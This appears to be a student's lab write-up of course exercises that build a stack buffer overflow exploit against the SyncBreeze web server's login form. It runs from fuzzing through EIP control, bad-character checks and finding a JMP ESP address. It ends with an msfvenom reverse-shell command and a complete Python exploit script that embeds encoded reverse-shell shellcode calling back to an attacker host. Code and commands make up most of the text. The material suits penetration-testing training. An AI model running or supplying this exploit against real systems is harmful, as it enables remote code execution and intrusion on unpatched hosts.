# 11.1.2 Discovering the Vulnerability
## Practice - Discovering the Vulnerability

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Build the fuzzer and replicate the SyncBreeze crash.
To start we must first build a fuzzer using python. We can use the following code:
```python
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.222.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.222.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.222.10", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
```
We must now start the syncbreeze service and attach Immunity Debugger to said service. Once this is done we can begin our fuzzer script, watching the Immunity Debugger window for crashes.
We see that the Immunity Debugger notes a crash at 800 bytes.


2.  Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?
The ESP register contains "A's" and we can also see the "A" characters on the stack itself.
![[imun_A.png]]


# 11.2.4 Controlling EIP
## Practice - Controlling EIP

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Write a standalone script to replicate the crash.
The following python3 script will lead to a crash:
```python
#!/usr/bin/python
import socket

try:
	print("\nAttempting to send buffer...")

	size = 800
	inputbuffer = "A" * size

	content = "username=" + inputbuffer + "&password=A"

	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.222.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.222.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	  
	buffer += content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  
	s.connect(("192.168.222.10", 80))
	encoded = buffer.encode()
	s.send(encoded)
		  
	s.close()

	print("\nSuccess!")

except:
	print("\nCould not connect")
```

2.  Determine the offset within the input buffer to successfully control EIP. &
3. Update your standalone script to place a unique value into EIP to ensure your offset is correct.
To do this we simply need to create a pattern buffer with a length of 800 using the metasploit tool "msf-pattern_offset". Once we have this buffer generated we replace the "inputbuffer" variable in our previous code with this newly created pattern. We now see a our pattern has overwritten the EIP register
![[imun_eip.png]]

We can now use msf-pattern_offset to identify the exact location of this in our buffer is at offset 780. Accounting for this, we adjust our initial script:
```python
filler = "A" * 780
eip = "B" * 4
buffer = "C" * 16

inputBuffer = filler + eip + buffer
```

We now should have 4 B's present in the EIP register and ESP should contain C's.

![[imun_eip_esp.png]]

# 11.2.8 Checking for Bad Characters
#### Exercises

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Repeat the required steps in order to identify the bad characters that cannot be included in the payload.
First we must extend our initial buffer in order to allow more space for the shell code. We simply increase our buffer from 800 to 1500 with the following snippet:
```python
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
```

We can see the ESP points to the D's we have copied.
![[imun_D.png]]
Now that we have more room to work with we can begin checking for bad characters. We do this by replacing the D's with a list of hex characters. The script being used to check bad characters can be found here:
```python
#!/usr/bin/python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
  print "\nSending buffer overflow..."
  
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4

  inputBuffer = filler + eip + offset + badchars
  
  content = "username=" + inputBuffer + "&password=A"


  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.222.10\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.222.10/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.222.10", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nSuccess"
  
except:
  print "\nCould not connect!"
```

After this is sent and we encounter the crash we simply need to select the ESP register and select Follow in Dump to show the output of these characters. As we can see from the screenshot below we made it as far as the 0x09 character before encountering a bad character. As the next character, 0x0A, represents a line feed which terminates HTTP field similar to a carriage return this character will not be able to be used in our shellcode as it will not be present when passed to the program. We can continue this trial and error process until we have removed all bad characters.

![[imun_hex_dump.png]]

2.  Why are these characters not allowed? How do these bad hex characters translate to ASCII?
The list of bad characters and their conversions is as follows:
```
\x00 null byte
\x0a \n
\x0d \r
\x25 %
\x26 &
\x2b +
\x3d =
```
These characters have special properties which will mangle our input buffer




# 11.2.10 - Finding a Return Address
#### Exercises

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Locate the JMP ESP that is usable in the exploit.
	As support libraries often contain the JMP ESP instruction our goal will be to find one that meets our needs. To begin we must first attach Immunity Debugger to the Syncbreeze service. Once we have Immunity Debugger attached to syncbreeze we can request information on currently loaded DLLs via "mona modules" 
	![[Pasted image 20220713140938.png]]

![[Pasted image 20220713141240.png]]

Here we can see that the DLL "LIBSPP.DLL" has SafeSEH, ASLR, and NXCompat disabled which is required for this exploit. It is also being loaded at 0x100000 which does not contain any bad characters.

The next step is to find the hexadecimal representation, or opcode, of JMP ESP. We can use msf-nasm_shell for this.
![[Pasted image 20220713142249.png]]

We must now search for FFE4, or "\xff\xe4", in the LIBSPP.DLL module using the following mona command
`!mona find -s "\xff\xe4" -m "libspp.dll"`
From this search we find one address which luckily does not contain any bad characters.
![[Pasted image 20220713142615.png]]

We can then view this address using the "Go to address in dissassembler" button.
![[Pasted image 20220713142857.png]]

We have now found out JMP ESP instruction.
![[Pasted image 20220713142941.png]]



2.  Update your PoC to include the discovered JMP ESP, set a breakpoint on it, and follow the execution to the placeholder shellcode.

First, we set a breakpoint (F2) on the JMP ESP instruction we have just found in order to follow the execution of the instruction. We now let the application run.
![[Pasted image 20220713143634.png]]

We then update the eip variable in our exploit to point to 0x10090c83, due to little endianess we must place the address in reverse order. The exploit being used will look like this:
```python
#!/usr/bin/python

import socket

 try:
	print("\nAttempting to send buffer...")

	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

	inputBuffer = filler + eip + offset + buffer



	content = b"username=" + inputBuffer + b"&password=A"


	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.233.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.233.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	  
	buffer += content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  
	s.connect(("192.168.233.10", 80))
	encoded = buffer.encode()
	s.send(encoded)
		  
	s.close()

	print("\nSuccess!")

 except:
 	print("\nCould not connect")
```

After running the code we end at our JMP ESP breakpoint
![[Pasted image 20220713151141.png]]

Stepping into this command sends us to the "D" placeholder, signifying a successful jump.
![[Pasted image 20220713151246.png]]

# 11.2.13 Getting a Shell
#### Exercises

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Update your PoC to include a working payload.
In order to generate shellcode we will be using MSFVenom, the following command can be used to generate our shellcode. Note the bad characters discovered earlier which the encoder will avoid using.
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.233 PORT=9000 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`

![[Pasted image 20220713215416.png]]

The shellcode has now been generated and can be added to our PoC.
```python
#!/usr/bin/python2
import socket

try:
  print "\nSending buffer..."

  shellcode = ("\xdb\xdb\xd9\x74\x24\xf4\xbe\x65\xd1\xc0\xc5\x58\x29\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\xa5\xd5\x22\x30\xd9\x3e\x20"
"\xbb\x21\xbf\x45\x35\xc4\x8e\x45\x21\x8d\xa1\x75\x21\xc3\x4d"
"\xfd\x67\xf7\xc6\x73\xa0\xf8\x6f\x39\x96\x37\x6f\x12\xea\x56"
"\xf3\x69\x3f\xb8\xca\xa1\x32\xb9\x0b\xdf\xbf\xeb\xc4\xab\x12"
"\x1b\x60\xe1\xae\x90\x3a\xe7\xb6\x45\x8a\x06\x96\xd8\x80\x50"
"\x38\xdb\x45\xe9\x71\xc3\x8a\xd4\xc8\x78\x78\xa2\xca\xa8\xb0"
"\x4b\x60\x95\x7c\xbe\x78\xd2\xbb\x21\x0f\x2a\xb8\xdc\x08\xe9"
"\xc2\x3a\x9c\xe9\x65\xc8\x06\xd5\x94\x1d\xd0\x9e\x9b\xea\x96"
"\xf8\xbf\xed\x7b\x73\xbb\x66\x7a\x53\x4d\x3c\x59\x77\x15\xe6"
"\xc0\x2e\xf3\x49\xfc\x30\x5c\x35\x58\x3b\x71\x22\xd1\x66\x1e"
"\x87\xd8\x98\xde\x8f\x6b\xeb\xec\x10\xc0\x63\x5d\xd8\xce\x74"
"\xa2\xf3\xb7\xea\x5d\xfc\xc7\x23\x9a\xa8\x97\x5b\x0b\xd1\x73"
"\x9b\xb4\x04\xd3\xcb\x1a\xf7\x94\xbb\xda\xa7\x7c\xd1\xd4\x98"
"\x9d\xda\x3e\xb1\x34\x21\xa9\x7e\x60\x5e\xc0\x17\x73\xa0\x03"
"\xb4\xfa\x46\x49\x54\xab\xd1\xe6\xcd\xf6\xa9\x97\x12\x2d\xd4"
"\x98\x99\xc2\x29\x56\x6a\xae\x39\x0f\x9a\xe5\x63\x86\xa5\xd3"
"\x0b\x44\x37\xb8\xcb\x03\x24\x17\x9c\x44\x9a\x6e\x48\x79\x85"
"\xd8\x6e\x80\x53\x22\x2a\x5f\xa0\xad\xb3\x12\x9c\x89\xa3\xea"
"\x1d\x96\x97\xa2\x4b\x40\x41\x05\x22\x22\x3b\xdf\x99\xec\xab"
"\xa6\xd1\x2e\xad\xa6\x3f\xd9\x51\x16\x96\x9c\x6e\x97\x7e\x29"
"\x17\xc5\x1e\xd6\xc2\x4d\x2e\x9d\x4e\xe7\xa7\x78\x1b\xb5\xa5"
"\x7a\xf6\xfa\xd3\xf8\xf2\x82\x27\xe0\x77\x86\x6c\xa6\x64\xfa"
"\xfd\x43\x8a\xa9\xfe\x41")

  filler = "A" * 780
  eip = "\x83\x0c\x09\x10"
  offset = "C" * 4
  nops = "\x90" * 10

  inputBuffer = filler + eip + offset + nops + shellcode
  
  content = "username=" + inputBuffer + "&password=A"

  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nDone, you should have a shell."
  
except:
  print "\nCould not connect."
```

2.  Attempt to execute your exploit without using a NOP sled and observe the decoder corrupting the stack.


3.  Add a NOP sled to your PoC and obtain a shell from SyncBreeze.